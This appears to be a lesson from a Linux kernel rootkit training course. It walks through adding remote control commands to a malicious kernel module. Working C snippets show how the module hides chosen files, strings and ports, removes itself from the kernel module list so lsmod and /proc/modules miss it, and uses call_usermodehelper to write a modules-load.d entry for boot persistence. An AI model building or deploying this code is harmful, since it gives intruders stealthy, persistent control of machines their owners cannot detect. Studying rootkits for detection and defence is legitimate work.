# Remote HIDE, MODULE, PERSIST commands

The mkdir dispatcher gave local control over hiding. This lesson wires the same
logic to the TCP protocol so the operator can manage targets remotely without
shell access on the host.

## New wire commands

```text
HIDE FILE <prefix>      add prefix to the hidden-files array
HIDE CONTENT <string>   add string to the hidden-content array
HIDE PORT <number>      add port to the hidden-ports array
HIDE MODULE             remove this module from the kernel module list
UNHIDE MODULE           restore this module to the kernel module list
PERSIST                 write a modules-load.d entry for boot persistence
UNPERSIST               remove the modules-load.d entry
```

Each command arrives as a newline-terminated ASCII string on the control socket.
The response is a short confirmation or error, also newline-terminated.

## Parsing arguments

Commands with arguments carry them after a fixed prefix. After stripping the
trailing newline:

```c
if (strncmp(cmd, "HIDE FILE ", 10) == 0)
    return rk_cmd_hide_file(client, cmd + 10);
```

For ports, parse the decimal string with `kstrtou16`:

```c
unsigned short port;
if (kstrtou16(arg, 10, &port) || port == 0)
    return rk_send(client, "invalid port\n", 13);
```

Copy string arguments into the target array with `strscpy`, which guarantees
NUL termination and returns an error if the source is too long:

```c
strscpy(hidden_files[file_count], name, RK_TARGET_LEN);
```

Always check that the count has not reached `RK_MAX_TARGETS` before inserting.

## Module list hiding

The kernel maintains a doubly-linked list of loaded modules. Each module's
`struct module` contains a `list` member that chains it into this list. To hide
from `lsmod` and `/proc/modules`:

```c
static struct list_head *saved_prev;
static bool module_hidden;

/* Hide: save the predecessor, then unlink */
saved_prev = THIS_MODULE->list.prev;
list_del_init(&THIS_MODULE->list);
module_hidden = true;

/* Unhide: reinsert after the saved predecessor */
list_add(&THIS_MODULE->list, saved_prev);
module_hidden = false;
```

Use `list_del_init` rather than `list_del` so the detached node is a valid
empty list, safe to inspect while hidden. On module exit, restore visibility
before any other teardown so the kernel can find and clean up the module.

## Boot persistence

`call_usermodehelper` runs a userspace program from kernel context. To create a
`modules-load.d` entry that reloads the module at boot:

```c
char *argv[] = { "/bin/sh", "-c",
    "echo rklings > /etc/modules-load.d/rklings.conf", NULL };
char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
```

`UMH_WAIT_PROC` blocks until the child exits, so you can check the return
value. `UNPERSIST` removes the file with `rm -f`.

## Your task

Edit `main.c`:

1. Implement `rk_cmd_hide_file`: validate bounds and length, copy with
   `strscpy`, increment count, send `"hidden\n"`.
2. Implement `rk_cmd_hide_content`: same pattern for the content array.
3. Implement `rk_cmd_hide_port`: parse with `kstrtou16`, reject zero, store
   and increment, send `"hidden\n"`.
4. Implement `rk_cmd_hide_module` and `rk_cmd_unhide_module`: save the list
   predecessor, unlink or reinsert, track state with a boolean.
5. Implement `rk_cmd_persist` and `rk_cmd_unpersist`: use
   `call_usermodehelper` to write or remove the modules-load.d entry.
6. Wire all commands into `rk_dispatch`.
7. In `rk_exit`, restore module visibility if hidden before other teardown.

Run:

```sh
./rklings check
```

## References

- [`list_del_init` and linked-list API](https://github.com/torvalds/linux/blob/v7.2/include/linux/list.h)
- [`call_usermodehelper`](https://github.com/torvalds/linux/blob/v7.2/include/linux/umh.h)
- [`kstrtou16`](https://github.com/torvalds/linux/blob/v7.2/include/linux/kstrtox.h)
- [`strscpy`](https://github.com/torvalds/linux/blob/v7.2/include/linux/string.h)
